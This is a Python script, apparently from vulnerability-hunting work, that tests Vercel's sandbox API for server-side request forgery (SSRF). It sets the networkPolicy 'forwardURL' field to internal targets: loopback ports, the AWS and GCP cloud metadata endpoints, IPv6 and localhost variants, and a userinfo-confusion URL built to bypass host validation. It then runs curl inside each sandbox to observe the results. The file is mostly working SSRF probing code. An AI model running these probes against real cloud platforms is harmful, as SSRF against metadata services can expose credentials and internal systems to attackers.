# -*- coding: utf-8 -*-
"""forwardURL https 版 SSRF 探测 (v48)
S1: 语义验证 -> https://httpbin.org/anything/forward_probe (确认重写+执行点)
S2: https://127.0.0.1:8080 (控制面本机 SSRF)
S3: https://127.0.0.1:26661 (执行点定位: sandbox 内 26661 已知存在)
S4: https://169.254.169.254 (AWS MMDS https)
S5: https://metadata.google.internal (GCP metadata https 标准端口)
S6: https://httpbin.org@127.0.0.1:8080 (userinfo 混淆绕过 host 校验)
S7: https://[::1]:8080 (IPv6 loopback)
S8: https://localhost:8080 (localhost 域名)"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TOKEN, TEAM, PROJ

NAME = 'tf48'

def api_raw(method, path, body=None, ctype='application/json', timeout=120):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + TOKEN)
    if ctype:
        req.add_header('Content-Type', ctype)
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode(errors='replace')[:1500]
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors='replace')[:1500]
    except Exception as e:
        return -1, 'EXC %s' % e

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

def mk(fwd):
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    body = {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"allow": {"httpbin.org": [{"forwardURL": fwd}]}}}
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, body, 90)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    ok = c == 200
    print('[create %s] -> %d %s' % (fwd[:60], c, (r or '')[:150]), flush=True)
    if not ok:
        return None
    return json.loads(r)['sandbox']['currentSessionId']

def probe(sid, tag):
    guest = ('echo "== %s"; echo "-- GET http://httpbin.org/"; curl -s --max-time 8 -i http://httpbin.org/ 2>&1 | head -30; '
             'echo; echo "-- GET https://httpbin.org/"; curl -s --max-time 8 -k -i https://httpbin.org/ 2>&1 | head -30') % tag
    b64 = base64.b64encode(guest.encode()).decode()
    c, r = cmd(sid, 'python3', ['-c', 'import base64;open("/tmp/g.sh","w").write(base64.b64decode("%s").decode())' % b64], timeout_ms=30000)
    c, r = cmd(sid, 'sh', ['/tmp/g.sh'], timeout_ms=40000)
    print('[%s] %s' % (tag, parse_data(r).strip()[:1200]), flush=True)

if __name__ == '__main__':
    tests = [
        ('S1-semantics', 'https://httpbin.org/anything/forward_probe'),
        ('S2-127-8080', 'https://127.0.0.1:8080/ssrf_probe'),
        ('S3-127-26661', 'https://127.0.0.1:26661/ssrf_probe'),
        ('S4-mmds', 'https://169.254.169.254/latest/meta-data/'),
        ('S5-gcp', 'https://metadata.google.internal/computeMetadata/v1/'),
        ('S6-userinfo', 'https://httpbin.org@127.0.0.1:8080/ssrf_probe_userinfo'),
        ('S7-ipv6', 'https://[::1]:8080/ssrf_probe6'),
        ('S8-localhost', 'https://localhost:8080/ssrf_probe_localhost'),
    ]
    for tag, fwd in tests:
        print('=== %s (%s) ===' % (tag, fwd[:80]), flush=True)
        sid = mk(fwd)
        if not sid:
            time.sleep(2)
            continue
        time.sleep(8)
        probe(sid, tag)
        api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
        time.sleep(3)
    print('CLEANED', flush=True)
